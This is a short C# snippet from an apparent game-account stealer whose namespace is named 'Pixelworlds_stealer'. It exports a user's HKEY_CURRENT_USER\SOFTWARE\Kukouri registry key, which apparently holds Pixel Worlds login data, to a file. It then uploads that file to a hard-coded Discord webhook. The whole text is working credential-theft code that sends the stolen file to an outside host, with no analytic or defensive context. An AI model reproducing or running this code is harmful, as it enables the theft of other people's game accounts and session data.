
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using Pixelworlds_stealer;


reg.ExportKey("HKEY_CURRENT_USER\\SOFTWARE\\Kukouri", "C:\\account.reg");


using (WebClient client = new WebClient())
{
    client.UploadFile("https://discord.com/api/webhooks/928647457326370896/DWdjrz5g9GCJ9QV_Yq_T4wTfyLsK76lksoG77M8DTx8uV35DQ9ggWRj8XhU2DDXXbxex", "C:/account.reg");
}
